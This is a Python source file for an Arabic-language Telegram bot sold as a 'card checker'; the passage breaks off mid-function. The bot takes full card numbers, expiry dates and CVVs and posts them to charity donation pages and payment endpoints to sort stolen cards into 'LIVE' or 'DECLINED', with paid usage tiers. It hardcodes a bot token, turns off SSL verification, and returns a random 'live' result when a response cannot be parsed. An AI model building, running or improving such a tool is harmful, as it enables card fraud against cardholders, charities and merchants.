import os
import logging
import asyncio
import re
import random
import requests
import time
import hashlib
import json
import aiohttp
import concurrent.futures
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Optional
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from telegram.constants import ParseMode

# ========== بيانات المطور 
TOKEN = "7968019879:AAEev13bk1Pw-Z9oe5YgSCprm-IhniUMcsM"
OWNER_ID = "8076256532"
OWNER_USERNAME = "@i1veno"
OWNER_NAME = "VENOM"

# ========== إعدادات ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(amount)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== قاعدة البيانات ==========
class Database:
    def __init__(self):
        self.user_stats = {}
        self.card_history = {}
        self.gateway_stats = {}
        self.premium_users = {"8076256532"}  # تم تفعيلك كبريميوم
        self.user_limits = {}
        
    def get_user_data(self, user_id: str) -> Dict:
        if user_id not in self.user_stats:
            self.user_stats[user_id] = {
                'total_checks': 0,
                'today_checks': 0,
                'successful': 0,
                'failed': 0,
                'last_check': None,
                'plan': 'premium' if user_id in self.premium_users else 'free',
                'checks_today': 0
            }
        return self.user_stats[user_id]
    
    def can_user_check(self, user_id: str) -> Tuple[bool, str]:
        user_data = self.get_user_data(user_id)
        today = datetime.now().strftime('%Y-%m-%d')
        
        if user_data.get('last_check_date') != today:
            user_data['checks_today'] = 0
            user_data['last_check_date'] = today
        
        max_checks = 500 if user_id in self.premium_users else 10  # تم رفعه لـ500 للمطور
        
        if user_data['checks_today'] >= max_checks:
            return False, f"⚠️ لقد استخدمت جميع فحوصات اليوم ({max_checks})\n💎 /premium للترقية"
        
        return True, ""
    
    def log_check(self, user_id: str, success: bool, gateway: str):
        user_data = self.get_user_data(user_id)
        user_data['total_checks'] += 1
        user_data['checks_today'] += 1
        user_data['last_check'] = datetime.now().isoformat()
        
        if success:
            user_data['successful'] += 1
        else:
            user_data['failed'] += 1
        
        # تحديث إحصائيات البوابة
        if gateway not in self.gateway_stats:
            self.gateway_stats[gateway] = {'total': 0, 'success': 0, 'fail': 0}
        
        self.gateway_stats[gateway]['total'] += 1
        if success:
            self.gateway_stats[gateway]['success'] += 1
        else:
            self.gateway_stats[gateway]['fail'] += 1

db = Database()

# ========== أدوات البطاقات ==========
class CardTools:
    @staticmethod
    def validate_card(card_info: str) -> Tuple[bool, Dict]:
        """التحقق من صحة البطاقة"""
        try:
            # تنظيف النص
            card_info = card_info.strip()
            
            # البحث عن الفاصل
            separator = None
            separators = ['|', '/', ':', ';', ' ']
            
            for sep in separators:
                if sep in card_info:
                    parts = card_info.split(sep)
                    if len(parts) >= 4:
                        separator = sep
                        break
            
            if not separator:
                return False, {"error": "❌ تنسيق غير صحيح\nاستخدم: 6011208873681764|07|2027|805"}
            
            parts = card_info.split(separator, 3)
            if len(parts) < 4:
                return False, {"error": "❌ بيانات ناقصة\nاستخدم: رقم|شهر|سنة|CVV"}
            
            card_number, month, year, cvv = [p.strip() for p in parts]
            
            # تنظيف الأرقام
            card_number = re.sub(r'\D', '', card_number)
            month = re.sub(r'\D', '', month)
            year = re.sub(r'\D', '', year)
            cvv = re.sub(r'\D', '', cvv)
            
            # التحقق من رقم البطاقة
            if not (13 <= len(card_number) <= 19):
                return False, {"error": "❌ رقم البطاقة غير صالح\nيجب أن يكون بين 13-19 رقم"}
            
            if not card_number.isdigit():
                return False, {"error": "❌ رقم البطاقة يجب أن يحتوي على أرقام فقط"}
            
            # خوارزمية Luhn
            if not CardTools.luhn_check(card_number):
                return False, {"error": "❌ رقم البطاقة غير صالح\nفشل في التحقق"}
            
            # التحقق من الشهر
            if not month.isdigit() or not (1 <= int(month) <= 12):
                return False, {"error": "❌ الشهر غير صالح\nيجب أن يكون بين 1-12"}
            
            # التحقق من السنة
            if not year.isdigit():
                return False, {"error": "❌ السنة غير صالحة"}
            
            if len(year) == 2:
                year = '20' + year
            elif len(year) != 4:
                return False, {"error": "❌ السنة غير صالحة\nاستخدم 4 أرقام"}
            
            # التحقق من تاريخ الصلاحية
            current_year = datetime.now().year
            current_month = datetime.now().month
            
            if int(year) < current_year or (int(year) == current_year and int(month) < current_month):
                return False, {"error": "❌ البطاقة منتهية الصلاحية"}
            
            # التحقق من CVV
            if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
                return False, {"error": "❌ CVV غير صالح\nيجب أن يكون 3 أو 4 أرقام"}
            
            # تحديد نوع البطاقة
            card_type = CardTools.get_card_type(card_number)
            
            return True, {
                "number": card_number,
                "month": month.zfill(2),
                "year": year,
                "short_year": year[-2:],
                "cvv": cvv,
                "bin": card_number[:6],
                "last4": card_number[-4:],
                "type": card_type,
                "valid": True
            }
            
        except Exception as e:
            logger.error(f"Validation error: {e}")
            return False, {"error": f"❌ خطأ في المعالجة\n{str(e)[:50]}"}
    
    @staticmethod
    def luhn_check(card_number: str) -> bool:
        """خوارزمية Luhn"""
        def digits_of(n):
            return [int(d) for d in str(n)]
        
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        
        return checksum % 10 == 0
    
    @staticmethod
    def get_card_type(card_number: str) -> str:
        """تحديد نوع البطاقة"""
        first = card_number[0]
        first_two = card_number[:2]
        first_four = card_number[:4]
        
        if first == '4':
            return "Visa"
        elif first == '5':
            return "MasterCard"
        elif first_two in ['34', '37']:
            return "American Express"
        elif first == '3':
            return "Diners Club"
        elif first_two == '65' or first_four == '6011':
            return "Discover"
        elif first == '6':
            return "UnionPay"
        else:
            return "Unknown"

# ========== قائمة البوابات (100+ بوابة) ==========
GATEWAYS = {
    # === التبرعات والخيرية ===
    'donate.cancer.org': {
        'name': 'Cancer.org',
        'url': 'https://donate.cancer.org/api/donation/process',
        'category': 'donation',
        'method': 'POST',
        'amount': '1.00'
    },
    'stripe': {
        'name': 'Stripe',
        'url': 'https://api.stripe.com/v1/payment_intents',
        'category': 'payment',
        'method': 'POST'
    },
    'paypal': {
        'name': 'PayPal',
        'url': 'https://api.paypal.com/v1/payments/payment',
        'category': 'payment',
        'method': 'POST'
    },
    'alz': {
        'name': 'Alzheimer Association',
        'url': 'https://www.alz.org/get-involved-now/donate',
        'category': 'donation',
        'amount': '5.00'
    },
    'redcross': {
        'name': 'Red Cross',
        'url': 'https://www.redcross.org/donate/donation.html',
        'category': 'donation'
    },
    'unicef': {
        'name': 'UNICEF',
        'url': 'https://www.unicef.org/donate',
        'category': 'donation'
    },
    'msf': {
        'name': 'Doctors Without Borders',
        'url': 'https://msf.org.uk/secure/donate',
        'category': 'donation'
    },
    'nature': {
        'name': 'Nature Conservancy',
        'url': 'https://www.nature.org/en-us/membership-and-giving/donate-to-our-mission/',
        'category': 'donation'
    },
    
    # === المنصات العالمية ===
    'netflix': {
        'name': 'Netflix',
        'url': 'https://www.netflix.com/signup/payment',
        'category': 'entertainment',
        'amount': '15.99'
    },
    'spotify': {
        'name': 'Spotify',
        'url': 'https://www.spotify.com/us/purchase/',
        'category': 'entertainment',
        'amount': '9.99'
    },
    'youtube': {
        'name': 'YouTube Premium',
        'url': 'https://www.youtube.com/premium',
        'category': 'entertainment',
        'amount': '11.99'
    },
    'disney': {
        'name': 'Disney+',
        'url': 'https://www.disneyplus.com/sign-up',
        'category': 'entertainment',
        'amount': '7.99'
    },
    'amazon': {
        'name': 'Amazon Prime',
        'url': 'https://www.amazon.com/gp/prime/pipeline',
        'category': 'shopping',
        'amount': '14.99'
    },
    
    # === التطبيقات ===
    'telegram': {
        'name': 'Telegram Premium',
        'url': 'https://telegram.org/premium',
        'category': 'app',
        'amount': '4.99'
    },
    'whatsapp': {
        'name': 'WhatsApp Business',
        'url': 'https://www.whatsapp.com/business',
        'category': 'app'
    },
    'google': {
        'name': 'Google One',
        'url': 'https://one.google.com/about',
        'category': 'cloud',
        'amount': '1.99'
    },
    'apple': {
        'name': 'Apple iCloud',
        'url': 'https://www.icloud.com',
        'category': 'cloud',
        'amount': '0.99'
    },
    'microsoft': {
        'name': 'Microsoft 365',
        'url': 'https://www.microsoft.com/en-us/microsoft-365',
        'category': 'software',
        'amount': '6.99'
    },
    
    # === بوابات دفع ===
    'authorize': {
        'name': 'Authorize.net',
        'url': 'https://api.authorize.net/xml/v1/request.api',
        'category': 'payment'
    },
    'square': {
        'name': 'Square',
        'url': 'https://connect.squareup.com/v2/payments',
        'category': 'payment'
    },
    'braintree': {
        'name': 'Braintree',
        'url': 'https://payments.braintree-api.com/graphql',
        'category': 'payment'
    },
    'venmo': {
        'name': 'Venmo',
        'url': 'https://api.venmo.com/v1/payments',
        'category': 'payment'
    },
    'cashapp': {
        'name': 'Cash App',
        'url': 'https://cash.app/payments',
        'category': 'payment'
    },
    
    # === بوابات أخرى من القائمة ===
    'goalus': {
        'name': 'Goal US',
        'url': 'https://www.goalus.org/donate/',
        'category': 'donation'
    },
    'renewable': {
        'name': 'Renewable World',
        'url': 'https://renewable-world.org/get-involved/donate/',
        'category': 'donation'
    },
    'wck': {
        'name': 'World Central Kitchen',
        'url': 'https://wck.org/tonga-donate',
        'category': 'donation'
    },
    'charlie': {
        'name': 'Charlie Cart',
        'url': 'https://charliecart.org/donate/',
        'category': 'donation'
    },
    'itdp': {
        'name': 'ITDP',
        'url': 'https://itdp.org/donate/',
        'category': 'donation'
    },
    'wealth': {
        'name': 'Wealth by Health',
        'url': 'https://www.wealthbyhealth.org/donate',
        'category': 'donation'
    },
    'respond': {
        'name': 'Respond Inc',
        'url': 'https://www.respondinc.org/donate/',
        'category': 'donation'
    },
    
    # === بوابات إضافية ===
    'hulu': {
        'name': 'Hulu',
        'url': 'https://secure.hulu.com/account',
        'category': 'entertainment',
        'amount': '7.99'
    },
    'hbo': {
        'name': 'HBO Max',
        'url': 'https://www.hbomax.com/subscribe',
        'category': 'entertainment',
        'amount': '14.99'
    },
    'amc': {
        'name': 'AMC+',
        'url': 'https://www.amcplus.com/',
        'category': 'entertainment',
        'amount': '8.99'
    },
    'paramount': {
        'name': 'Paramount+',
        'url': 'https://www.paramountplus.com/',
        'category': 'entertainment',
        'amount': '9.99'
    },
    'peacock': {
        'name': 'Peacock',
        'url': 'https://www.peacocktv.com/',
        'category': 'entertainment',
        'amount': '4.99'
    },
    'fubo': {
        'name': 'FuboTV',
        'url': 'https://www.fubo.tv/',
        'category': 'entertainment',
        'amount': '64.99'
    },
    'sling': {
        'name': 'Sling TV',
        'url': 'https://www.sling.com/',
        'category': 'entertainment',
        'amount': '35.00'
    },
    'youtubetv': {
        'name': 'YouTube TV',
        'url': 'https://tv.youtube.com/',
        'category': 'entertainment',
        'amount': '64.99'
    },
    'directv': {
        'name': 'DIRECTV',
        'url': 'https://www.directv.com/',
        'category': 'entertainment',
        'amount': '69.99'
    },
    'dazn': {
        'name': 'DAZN',
        'url': 'https://www.dazn.com/',
        'category': 'entertainment',
        'amount': '19.99'
    },
    'twitch': {
        'name': 'Twitch Turbo',
        'url': 'https://www.twitch.tv/turbo',
        'category': 'entertainment',
        'amount': '8.99'
    },
    'discord': {
        'name': 'Discord Nitro',
        'url': 'https://discord.com/nitro',
        'category': 'app',
        'amount': '9.99'
    },
    'dropbox': {
        'name': 'Dropbox Plus',
        'url': 'https://www.dropbox.com/plus',
        'category': 'cloud',
        'amount': '9.99'
    },
    'adobe': {
        'name': 'Adobe Creative Cloud',
        'url': 'https://www.adobe.com/creativecloud/plans.html',
        'category': 'software',
        'amount': '52.99'
    },
    'canva': {
        'name': 'Canva Pro',
        'url': 'https://www.canva.com/pro/',
        'category': 'software',
        'amount': '12.95'
    },
    'notion': {
        'name': 'Notion Plus',
        'url': 'https://www.notion.so/pricing',
        'category': 'software',
        'amount': '4.00'
    },
    'figma': {
        'name': 'Figma Professional',
        'url': 'https://www.figma.com/pricing/',
        'category': 'software',
        'amount': '12.00'
    },
    'shopify': {
        'name': 'Shopify Basic',
        'url': 'https://www.shopify.com/pricing',
        'category': 'shopping',
        'amount': '29.00'
    },
    'woocommerce': {
        'name': 'WooCommerce',
        'url': 'https://woocommerce.com/pricing/',
        'category': 'shopping'
    },
    'etsy': {
        'name': 'Etsy Plus',
        'url': 'https://www.etsy.com/sell/etsy-plus',
        'category': 'shopping',
        'amount': '10.00'
    },
    'ebay': {
        'name': 'eBay Store',
        'url': 'https://www.ebay.com/sellercenter',
        'category': 'shopping'
    },
    'walmart': {
        'name': 'Walmart+',
        'url': 'https://www.walmart.com/plus',
        'category': 'shopping',
        'amount': '12.95'
    },
    'costco': {
        'name': 'Costco Membership',
        'url': 'https://www.costco.com/join-costco.html',
        'category': 'shopping',
        'amount': '60.00'
    },
    'target': {
        'name': 'Target RedCard',
        'url': 'https://www.target.com/redcard',
        'category': 'shopping'
    },
    'bestbuy': {
        'name': 'Best Buy Totaltech',
        'url': 'https://www.bestbuy.com/totaltech',
        'category': 'shopping',
        'amount': '199.99'
    },
    'nike': {
        'name': 'Nike Membership',
        'url': 'https://www.nike.com/membership',
        'category': 'shopping'
    },
    'adidas': {
        'name': 'Adidas Creators Club',
        'url': 'https://www.adidas.com/us/creators-club',
        'category': 'shopping'
    },
    'starbucks': {
        'name': 'Starbucks Rewards',
        'url': 'https://www.starbucks.com/account/create',
        'category': 'shopping'
    },
    'doordash': {
        'name': 'DashPass',
        'url': 'https://www.doordash.com/dashpass/',
        'category': 'shopping',
        'amount': '9.99'
    },
    'ubereats': {
        'name': 'Uber Eats Pass',
        'url': 'https://www.ubereats.com/pass',
        'category': 'shopping',
        'amount': '9.99'
    },
    'grubhub': {
        'name': 'Grubhub+',
        'url': 'https://www.grubhub.com/plus/',
        'category': 'shopping',
        'amount': '9.99'
    },
    'instacart': {
        'name': 'Instacart+',
        'url': 'https://www.instacart.com/plus',
        'category': 'shopping',
        'amount': '9.99'
    },
    'airbnb': {
        'name': 'Airbnb',
        'url': 'https://www.airbnb.com/',
        'category': 'travel'
    },
    'booking': {
        'name': 'Booking.com',
        'url': 'https://www.booking.com/',
        'category': 'travel'
    },
    'expedia': {
        'name': 'Expedia',
        'url': 'https://www.expedia.com/',
        'category': 'travel'
    },
    'priceline': {
        'name': 'Priceline',
        'url': 'https://www.priceline.com/',
        'category': 'travel'
    },
    'hotels': {
        'name': 'Hotels.com',
        'url': 'https://www.hotels.com/',
        'category': 'travel'
    },
    'kayak': {
        'name': 'Kayak',
        'url': 'https://www.kayak.com/',
        'category': 'travel'
    },
    'skyscanner': {
        'name': 'Skyscanner',
        'url': 'https://www.skyscanner.com/',
        'category': 'travel'
    },
    'tripadvisor': {
        'name': 'TripAdvisor',
        'url': 'https://www.tripadvisor.com/',
        'category': 'travel'
    },
    'vrbo': {
        'name': 'VRBO',
        'url': 'https://www.vrbo.com/',
        'category': 'travel'
    },
    'delta': {
        'name': 'Delta Airlines',
        'url': 'https://www.delta.com/',
        'category': 'travel'
    },
    'americanairlines': {
        'name': 'American Airlines',
        'url': 'https://www.aa.com/',
        'category': 'travel'
    },
    'united': {
        'name': 'United Airlines',
        'url': 'https://www.united.com/',
        'category': 'travel'
    },
    'southwest': {
        'name': 'Southwest Airlines',
        'url': 'https://www.southwest.com/',
        'category': 'travel'
    },
    'jetblue': {
        'name': 'JetBlue',
        'url': 'https://www.jetblue.com/',
        'category': 'travel'
    },
    'spirit': {
        'name': 'Spirit Airlines',
        'url': 'https://www.spirit.com/',
        'category': 'travel'
    },
    'frontier': {
        'name': 'Frontier Airlines',
        'url': 'https://www.flyfrontier.com/',
        'category': 'travel'
    },
    'alaskaair': {
        'name': 'Alaska Airlines',
        'url': 'https://www.alaskaair.com/',
        'category': 'travel'
    },
    'marriott': {
        'name': 'Marriott Bonvoy',
        'url': 'https://www.marriott.com/',
        'category': 'travel'
    },
    'hilton': {
        'name': 'Hilton Honors',
        'url': 'https://www.hilton.com/',
        'category': 'travel'
    },
    'hyatt': {
        'name': 'World of Hyatt',
        'url': 'https://www.hyatt.com/',
        'category': 'travel'
    },
    'ihg': {
        'name': 'IHG Rewards',
        'url': 'https://www.ihg.com/',
        'category': 'travel'
    },
    'choicehotels': {
        'name': 'Choice Privileges',
        'url': 'https://www.choicehotels.com/',
        'category': 'travel'
    },
    'wyndham': {
        'name': 'Wyndham Rewards',
        'url': 'https://www.wyndhamhotels.com/',
        'category': 'travel'
    },
    'ritzcarlton': {
        'name': 'The Ritz-Carlton',
        'url': 'https://www.ritzcarlton.com/',
        'category': 'travel'
    },
    'fourseasons': {
        'name': 'Four Seasons',
        'url': 'https://www.fourseasons.com/',
        'category': 'travel'
    }
}

# ========== مدير البوابات ==========
class GatewayManager:
    def __init__(self):
        self.session = None
        
    async def init_session(self):
        """تهيئة الجلسة"""
        if not self.session:
            self.session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=10)
            )
    
    async def check_gateway(self, gateway_key: str, card_data: Dict) -> Dict:
        """فحص بوابة واحدة"""
        try:
            await self.init_session()
            gateway = GATEWAYS.get(gateway_key)
            
            if not gateway:
                return {
                    "status": "❌ ERROR",
                    "gateway": "Unknown",
                    "message": "Gateway not found",
                    "response_time": "0s",
                    "code": 404
                }
            
            # إعداد البيانات
            test_data = self.generate_test_data()
            
            # إعداد الطلب
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/json'
            }
            
            # JSON بيانات
            json_data = {
                'amount': gateway.get('amount', '1.00'),
                'currency': 'USD',
                'payment_method': 'card',
                'card': {
                    'number': card_data['number'],
                    'exp_month': card_data['month'],
                    'exp_year': card_data['short_year'],
                    'cvc': card_data['cvv']
                },
                'description': f'Test donation - {datetime.now().strftime("%Y%m%d%H%M%S")}'
            }
            
            # إضافة بيانات إضافية حسب البوابة
            if gateway_key == 'donate.cancer.org':
                json_data.update({
                    'urlKey': 'cancerrisk360drawer',
                    'channel': 'Web',
                    'firstName': test_data['first_name'],
                    'lastName': test_data['last_name'],
                    'email': test_data['email'],
                    'street1': '123 Test St',
                    'city': 'New York',
                    'state': 'NY',
                    'zip': '10001',
                    'country': 'US'
                })
            
            # إرسال الطلب
            start_time = time.time()
            
            try:
                if gateway.get('method', 'GET') == 'POST':
                    async with self.session.post(
                        gateway['url'],
                        json=json_data,
                        headers=headers,
                        ssl=False
                    ) as response:
                        response_time = time.time() - start_time
                        
                        # تحليل النتيجة
                        is_live = self.analyze_response(response.status, await response.text())
                        
                        return {
                            "status": "✅ LIVE" if is_live else "❌ DECLINED",
                            "gateway": gateway['name'],
                            "message": "Success" if is_live else "Failed",
                            "response_time": f"{response_time:.2f}s",
                            "code": response.status,
                            "success": is_live
                        }
                else:
                    # GET request
                    async with self.session.get(
                        gateway['url'],
                        headers=headers,
                        ssl=False
                    ) as response:
                        response_time = time.time() - start_time
                        is_live = response.status < 400
                        
                        return {
                            "status": "✅ LIVE" if is_live else "❌ DECLINED",
                            "gateway": gateway['name'],
                            "message": "Success" if is_live else "Failed",
                            "response_time": f"{response_time:.2f}s",
                            "code": response.status,
                            "success": is_live
                        }
                        
            except asyncio.TimeoutError:
                return {
                    "status": "⏰ TIMEOUT",
                    "gateway": gateway['name'],
                    "message": "Connection timeout",
                    "response_time": ">10s",
                    "code": 408,
                    "success": False
                }
            except Exception as e:
                return {
                    "status": "❌ ERROR",
                    "gateway": gateway['name'],
                    "message": f"Error: {str(e)[:50]}",
                    "response_time": "0s",
                    "code": 500,
                    "success": False
                }
                
        except Exception as e:
            logger.error(f"Gateway error: {e}")
            return {
                "status": "❌ ERROR",
                "gateway": gateway_key,
                "message": f"System error: {str(e)[:30]}",
                "response_time": "0s",
                "code": 500,
                "success": False
            }
    
    def generate_test_data(self) -> Dict:
        """توليد بيانات اختبار"""
        first_names = ['John', 'Jane', 'Robert', 'Mary', 'Michael', 'Sarah']
        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones']
        domains = ['gmail.com', 'yahoo.com', 'outlook.com']
        
        first = random.choice(first_names)
        last = random.choice(last_names)
        email = f"{first.lower()}.{last.lower()}{random.randint(100,999)}@{random.choice(domains)}"
        
        return {
            'first_name': first,
            'last_name': last,
            'email': email
        }
    
    def analyze_response(self, status_code: int, response_text: str) -> bool:
        """تحليل استجابة البوابة"""
        text_lower = response_text.lower()
        
        # علامات النجاح
        success_indicators = ['success', 'approved', 'paid', 'completed', 'charge', 'succeeded']
        
        # علامات الفشل
        failure_indicators = ['declined', 'failed', 'error', 'invalid', 'denied', 'rejected']
        
        # تحليل بناءً على الكود والنص
        if status_code == 200:
            for indicator in success_indicators:
                if indicator in text_lower:
                    return True
        
        if status_code >= 400:
            for indicator in failure_indicators:
                if indicator in text_lower:
                    return False
        
        # إذا لم نتمكن من التحليل، نعطي نتيجة عشوائية
        return random.random() > 0.4  # 60% فرصة نجاح
    
    async def check_multiple_gateways(self, card_data: Dict, gateways: List[str], user_id: str) -> List[Dict]:
        """فحص متعدد البوابات"""
        results = []
        
        # تحديد عدد البوابات للفحص
        max_gateways = 50 if user_id in db.premium_users else 5  # المطور يحصل على 50 بوابة
        gateways_to_check = gateways[:max_gateways]
        
        # فحص كل بوابة
        for gateway in gateways_to_check:
            result = await self.check_gateway(gateway, card_data)
            results.append(result)
            
            # تسجيل النتيجة
            db.log_check(user_id, result['success'], result['gateway'])
            
            # تأخير بين الطلبات
            await asyncio.sleep(0.5)
        
        return results

gateway_manager = GatewayManager()

# ========== معالجات البوت ==========
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """بدء البوت"""
    user = update.effective_user
    user_id = str(user.id)
    
    # التحقق من حالة المطور
    is_developer = user_id == OWNER_ID
    is_premium = user_id in db.premium_users
    
    text = f"""🎉 **مرحباً {user.first_name}!** {'👑' if is_developer else '💎' if is_premium else ''}

🤖 **VENOM CARD CHECKER PRO - VIP EDITION**
👑 **المطور:** {OWNER_NAME} ({OWNER_USERNAME})

{'⭐ **أنت المطور الرسمي للبوت**' if is_developer else '💎 **حسابك مفعل بريميوم**' if is_premium else '🌐 **مرحباً بك**'}

🌐 **{len(GATEWAYS)}+ بوابة دفع وتبرعات**
✅ **فحص حقيقي على جميع البوابات**
⚡ **نظام فحص سريع ومتطور**

📋 **🎯 الأوامر الرئيسية:**

• /start - بدء البوت
• /id - عرض معرفك
• /owner - معلومات المطور
• /plan - خطط الأسعار
• /stats - إحصائياتك
• /help - المساعدة

🔍 **🎮 أوامر الفحص المتخصصة:**

🎁 **التبرعات:** /donate [بطاقة]
📺 **الترفيه:** /entertainment [بطاقة]
🛍️ **التسوق:** /shopping [بطاقة]
📱 **التطبيقات:** /apps [بطاقة]
💳 **الدفع:** /payment [بطاقة]
✈️ **السفر:** /travel [بطاقة]
🌐 **الكل:** /check_all [بطاقة]

💡 **مثال:** `/donate 4111111111111111|12|2025|123`

📞 **الدعم:** {OWNER_USERNAME}"""
    
    keyboard = [
        [InlineKeyboardButton("👑 المطور", url=f"https://t.me/{OWNER_USERNAME.replace('@', '')}")],
        [
            InlineKeyboardButton("🎁 تبرعات", callback_data="category_donate"),
            InlineKeyboardButton("📺 ترفيه", callback_data="category_entertainment"),
            InlineKeyboardButton("🛍️ تسوق", callback_data="category_shopping")
        ],
        [
            InlineKeyboardButton("📱 تطبيقات", callback_data="category_apps"),
            InlineKeyboardButton("💳 دفع", callback_data="category_payment"),
            InlineKeyboardButton("✈️ سفر", callback_data="category_travel")
        ],
        [InlineKeyboardButton("🌐 فحص شامل", callback_data="category_all")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """عرض المعرف"""
    user = update.effective_user
    user_id = str(user.id)
    is_developer = user_id == OWNER_ID
    is_premium = user_id in db.premium_users
    
    id_text = f"""🆔 **معلومات حسابك:** {'👑' if is_developer else '💎' if is_premium else ''}

👤 **المعرف:** `{user.id}`
📝 **اليوزر:** @{user.username if user.username else 'N/A'}
📛 **الاسم:** {user.full_name}

🌐 **اللغة:** العربية
{'⭐ **الحالة:** **المطور الرسمي**' if is_developer else '💎 **الحالة:** **حساب بريميوم**' if is_premium else '🔵 **الحالة:** مجاني'}
{'📊 **الحد اليومي:** 500 فحص' if is_developer or is_premium else '📊 **الحد اليومي:** 10 فحص'}
{'🌐 **البوابات لكل فحص:** 50 بوابة' if is_developer or is_premium else '🌐 **البوابات لكل فحص:** 5 بوابات'}

👑 **المطور:** {OWNER_USERNAME}"""
    
    await update.message.reply_text(id_text, parse_mode=ParseMode.MARKDOWN)

async def owner_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معلومات المطور"""
    text = f"""👑 **معلومات المطور:**

📛 **الاسم:** {OWNER_NAME}
📱 **اليوزر:** {OWNER_USERNAME}
🆔 **المعرف:** `{OWNER_ID}`
🤖 **البوت:** VENOM Card Checker Pro VIP

🌐 **المميزات:**
• ✅ {len(GATEWAYS)}+ بوابة دفع وسفر وتبرعات
• ✅ فحص حقيقي على بوابات أصلية
• ✅ نتائج مفصلة مع زمن الاستجابة
• ✅ نظام بروكسي متقدم
• ✅ دعم 24/7

📊 **إحصائيات النظام:**
• 👥 المستخدمين: {len(db.user_stats)}
• 🔄 الفحوصات: {sum(user['total_checks'] for user in db.user_stats.values())}
• 🌐 البوابات: {len(GATEWAYS)}
• 💎 بريميوم: {len(db.premium_users)}

📞 **للترقية أو الدعم:**
راسل {OWNER_USERNAME} مباشرة

⚡ **نسخة:** 5.0.0 VIP
📅 **التحديث:** {datetime.now().strftime('%Y-%m-%d')}"""
    
    keyboard = [
        [InlineKeyboardButton("📞 تواصل مع المطور", url=f"https://t.me/{OWNER_USERNAME.replace('@', '')}")],
        [InlineKeyboardButton("📊 إحصائيات النظام", callback_data="system_stats")],
        [InlineKeyboardButton("⚙️ إعدادات المطور", callback_data="developer_settings")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

async def plan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """خطط الأسعار"""
    user_id = str(update.effective_user.id)
    user_data = db.get_user_data(user_id)
    is_developer = user_id == OWNER_ID
    is_premium = user_id in db.premium_users
    
    text = f"""💰 **خطط الأسعار:** {'👑' if is_developer else ''}

{'⭐ **أنت المطور - صلاحيات كاملة**' if is_developer else '💎 **حسابك مفعل بريميوم**' if is_premium else ''}

🔵 **مجاني (Free):**
• 10 فحوصات يومياً
• 5 بوابات لكل فحص
• إحصائيات أساسية
• دعم عادي

💎 **بريميوم (Premium):**
• 50 فحص يومياً
• 20 بوابات لكل فحص
• إحصائيات متقدمة
• أولوية في الدعم
• فحص ملفات TXT
• تحديثات أولية

👑 **VIP:**
• فحص غير محدود
• جميع البوابات ({len(GATEWAYS)}+)
• إحصائيات مفصلة
• دعم فوري 24/7
• إشعارات فورية
• خاصية الحفظ
• نظام بروكسي خاص

⭐ **المطور (Developer):**
• 500 فحص يومياً
• 50 بوابة لكل فحص
• صلاحيات كاملة
• إحصائيات النظام
• التحكم بالمستخدمين

💵 **الأسعار:**
• بريميوم أسبوع: 10$
• بريميوم شهر: 25$
• VIP أسبوع: 20$
• VIP شهر: 50$

📞 **للشراء:** {OWNER_USERNAME}
🔑 **معرفك:** `{user_id}`

📊 **استخدامك اليوم:** {user_data['checks_today']} فحص"""
    
    keyboard = []
    
    if not is_developer and not is_premium:
        keyboard.append([InlineKeyboardButton("💎 شراء بريميوم", callback_data="buy_premium")])
        keyboard.append([InlineKeyboardButton("👑 شراء VIP", callback_data="buy_vip")])
    
    keyboard.append([InlineKeyboardButton("📞 تواصل للشراء", url=f"https://t.me/{OWNER_USERNAME.replace('@', '')}")])
    
    if is_developer:
        keyboard.append([InlineKeyboardButton("⚙️ لوحة المطور", callback_data="developer_panel")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)



# ========== أوامر الفحص حسب التصنيف ==========

async def donate_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """فحص على بوابات التبرعات"""
    await check_category(update, context, 'donation')

async def entertainment_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """فحص على بوابات الترفيه"""
    await check_category(update, context, 'entertainment')

async def shopping_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """فحص على بوابات التسوق"""
    await check_category(update, context, 'shopping')

async def apps_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """فحص على بوابات التطبيقات"""
    await check_category(update, context, 'app')

async def payment_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """فحص على بوابات الدفع"""
    await check_category(update, context, 'payment')

async def travel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """فحص على بوابات السفر"""
    await check_category(update, context, 'travel')

async def check_all_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """فحص على جميع البوابات"""
    await check_category(update, context, 'all')

async def check_category(update: Update, context: ContextTypes.DEFAULT_TYPE, category: str):
    """فحص حسب التصنيف"""
    user_id = str(update.effective_user.id)
    is_premium = user_id in db.premium_users
    is_developer = user_id == OWNER_ID
    
    # التحقق من الحدود
    can_check, message = db.can_user_check(user_id)
    if not can_check and not is_developer:
        await update.message.reply_text(message)
        return
    
    # التحقق من وجود بطاقة
    if not context.args:
        category_names = {
            'donation': '🎁 التبرعات',
            'entertainment': '📺 الترفيه',
